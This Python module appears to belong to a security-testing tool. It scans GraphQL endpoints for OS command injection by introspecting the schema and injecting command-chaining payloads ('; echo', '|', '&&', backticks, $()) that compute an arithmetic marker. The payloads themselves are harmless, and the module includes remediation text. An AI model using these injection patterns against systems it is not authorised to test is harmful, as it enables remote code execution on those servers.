"""GraphQL OS command-injection / RCE validator (deterministic).

The model can SPOT a dangerous resolver (brokencrystals' getCommandResult(command) returns
`uid=0(root)`), but owlforge had no deterministic validator for it, so a confirmed RCE was
dropped as an unvalidated note. This closes that gap: introspect the schema, find fields that
take a String argument (command-looking names first), inject a shell command that ECHOES a
COMPUTED arithmetic marker (a*b), and confirm the PRODUCT appears in the response. The product
never appears in the request, so a mere reflection of the payload cannot cause a false positive
— the value is there only if the command actually ran. Read-only: it runs `echo`, nothing else.
"""

from __future__ import annotations

import json
import secrets
from collections.abc import Callable
from urllib.parse import urlencode

# argument / field names that commonly reach a shell
_CMD_HINT = ("command", "cmd", "exec", "shell", "run", "ping", "host", "ip", "script",
             "code", "eval", "system", "os", "process", "spawn", "bash", "sh", "query")


def _req(sandbox, method, url, *, headers=None, body=None):
    try:
        return sandbox.http_request(method, url, headers=headers or {}, params=None,
                                    body=body, follow_redirects=False) or {}
    except TypeError:
        try:
            return sandbox.http_request(method, url, headers=headers or {}, params=None,
                                        body=body) or {}
        except Exception:
            return {}
    except Exception:
        return {}


def _gql(sandbox, url, query, headers):
    """Run a GraphQL query over POST (JSON) then GET (?query=), return the response body."""
    h = dict(headers or {})
    h["Content-Type"] = "application/json"
    r = _req(sandbox, "POST", url, headers=h, body=json.dumps({"query": query}))
    body = r.get("body") or ""
    if '"data"' in body or '"errors"' not in body and body:
        return body
    g = _req(sandbox, "GET", url + "?" + urlencode({"query": query}), headers=headers)
    return (g.get("body") or "") or body


def _unwrap(t: dict) -> tuple[str, str]:
    """Follow NON_NULL / LIST wrappers to the base (kind, name)."""
    seen = 0
    while isinstance(t, dict) and t.get("ofType") and t.get("kind") in ("NON_NULL", "LIST") \
            and seen < 8:
        t = t["ofType"]
        seen += 1
    return (t or {}).get("kind") or "", (t or {}).get("name") or ""


def _introspect(sandbox, url, headers) -> list[dict]:
    """Return [{name, scalar_return, args:[{name, is_string}]}] for query+mutation fields."""
    q = ("query{__schema{"
         "queryType{fields{name type{kind name ofType{kind name ofType{kind name}}} "
         "args{name type{kind name ofType{kind name ofType{kind name}}}}}} "
         "mutationType{fields{name type{kind name ofType{kind name ofType{kind name}}} "
         "args{name type{kind name ofType{kind name ofType{kind name}}}}}}}}")
    try:
        data = json.loads(_gql(sandbox, url, q, headers)).get("data", {}).get("__schema", {})
    except Exception:
        return []
    out = []
    for root in ("queryType", "mutationType"):
        for f in ((data.get(root) or {}) or {}).get("fields", []) or []:
            rkind, _ = _unwrap(f.get("type") or {})
            args = []
            for a in f.get("args", []) or []:
                akind, aname_t = _unwrap(a.get("type") or {})
                args.append({"name": a.get("name"),
                             "is_string": akind == "SCALAR" and aname_t in ("String", "ID"),
                             "scalar": akind == "SCALAR" or akind == "ENUM"})
            out.append({"name": f.get("name"), "root": root,
                        "scalar_return": rkind not in ("OBJECT", "INTERFACE", "UNION"),
                        "args": args})
    return out


def _rank(field) -> int:
    hit = any(any(h in (a["name"] or "").lower() for h in _CMD_HINT) for a in field["args"])
    hit = hit or any(h in (field["name"] or "").lower() for h in _CMD_HINT)
    return 0 if hit else 1


def _in_data(body: str, needle: str) -> bool:
    """True only if `needle` is in the response's DATA (command OUTPUT), not in an error that
    merely reflects the request — so a reflected payload can never be mistaken for execution."""
    try:
        d = json.loads(body or "")
    except Exception:
        return needle in (body or "")          # plain-text RCE output (non-JSON sink)
    data = d.get("data")
    return data is not None and needle in json.dumps(data)


def _build_query(field, inj_arg, payload) -> str | None:
    """A GraphQL doc setting inj_arg to payload and any other string arg to a dummy."""
    parts = []
    for a in field["args"]:
        if a["name"] == inj_arg["name"]:
            parts.append(f'{a["name"]}: "{payload}"')
        elif a["is_string"]:
            parts.append(f'{a["name"]}: "owl"')
        elif not a.get("scalar"):
            return None                      # a required object/list arg — too complex, skip
    arglist = ", ".join(parts)
    sel = "" if field["scalar_return"] else " { __typename }"
    op = "mutation" if field["root"] == "mutationType" else "query"
    return f'{op}{{ {field["name"]}({arglist}){sel} }}'


def _file(assessment_id, url, field_name, query, proof, evidence, log):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{secrets.token_hex(5)}", assessment_id=assessment_id,
            title=f"OS command injection (RCE) via GraphQL '{field_name}'",
            severity="critical", status="validated", confidence="high",
            endpoint=url, method="POST",
            technical_analysis=(
                f"The GraphQL field '{field_name}' passes its argument to an OS command: an "
                f"injected command ran and its output ({proof}) came back in the response — a "
                "value that is NOT present in the request, so this is execution, not reflection. "
                "An attacker runs arbitrary commands on the server with the API's privileges."),
            proof_of_concept=f"{query}\n\n-> response data contained {proof} (the executed output)"
                             f"\n\n{evidence[:600]}",
            impact="Remote code execution: an attacker runs arbitrary commands on the server "
                   "(often as root in a container), leading to full host and data compromise.",
            remediation="Never pass user input to an OS command. Remove the resolver or use a "
                        "fixed allow-list with execFile and no shell; drop privileges.",
            validation_note="GraphQL command injection: a computed/echoed marker ran and was "
                            "returned in the response data (deterministic)",
            success_signal=str(proof)))
        s.commit()


def graphql_rce_scan(assessment_id, inventory, sandbox, session_headers=None,
                     log: Callable[[str], None] = lambda m: None, target: str = "",
                     cap: int = 12) -> int:
    """Introspect the GraphQL endpoint and confirm OS command injection. Returns findings."""
    if sandbox is None:
        return 0
    from owlforge.engine.graphqlscan import _endpoints
    eps = _endpoints(inventory, sandbox, session_headers, target)
    if not eps:
        return 0
    filed = 0
    for url in eps[:3]:
        fields = _introspect(sandbox, url, session_headers)
        if not fields:
            continue
        cands = [f for f in fields if any(a["is_string"] for a in f["args"])]
        cands.sort(key=_rank)
        if cands:
            log(f"graphql-rce: probing {min(len(cands), cap)} field(s) with string args at {url}")
        for field in cands[:cap]:
            if _probe_field(assessment_id, url, field, sandbox, session_headers, log):
                filed += 1
                break                         # one confirmed RCE per endpoint is enough
    if filed:
        log(f"graphql-rce: {filed} command-injection (RCE) finding(s) confirmed")
    return filed


def _probe_field(assessment_id, url, field, sandbox, headers, log) -> bool:
    a, b = secrets.randbelow(9000) + 1000, secrets.randbelow(9000) + 1000
    prod = a * b
    # (payload, expected-output) pairs. The expected value is a computed number that never
    # appears in the request, so finding it in the response DATA proves execution, not echo.
    computed = [
        (f"expr {a} * {b}", prod),            # execFile-style runner (no shell) — e.g. brokencrystals
        (f"echo $(({a}*{b}))", prod),         # shell arithmetic (child_process.exec / sh -c)
        (f"; echo $(({a}*{b}))", prod),       # injection chained into an existing command (shell)
        (f"$(echo $(({a}*{b})))", prod),
        (f"`echo $(({a}*{b}))`", prod),
        (f"| echo $(({a}*{b}))", prod),
        (f"&& expr {a} * {b}", prod),
        (f"127.0.0.1; echo $(({a}*{b}))", prod),
    ]
    marker = "owlrce" + secrets.token_hex(4)
    for inj in [x for x in field["args"] if x["is_string"]]:
        for payload, expected in computed:
            sx = str(expected)
            query = _build_query(field, inj, payload)
            if not query or sx in query:          # never let the expected value leak into the request
                continue
            body = _gql(sandbox, url, query, headers)
            if _in_data(body, sx):
                _file(assessment_id, url, field["name"], query, expected, body, log)
                return True
        # last resort: a pure `echo` runner with no expr/shell — confirm the marker is RETURNED
        # as output (in data), and the literal `echo <marker>` is NOT (which would be reflection)
        query = _build_query(field, inj, f"echo {marker}")
        if query:
            body = _gql(sandbox, url, query, headers)
            if _in_data(body, marker) and f"echo {marker}" not in body:
                _file(assessment_id, url, field["name"], query, marker, body, log)
                return True
    return False
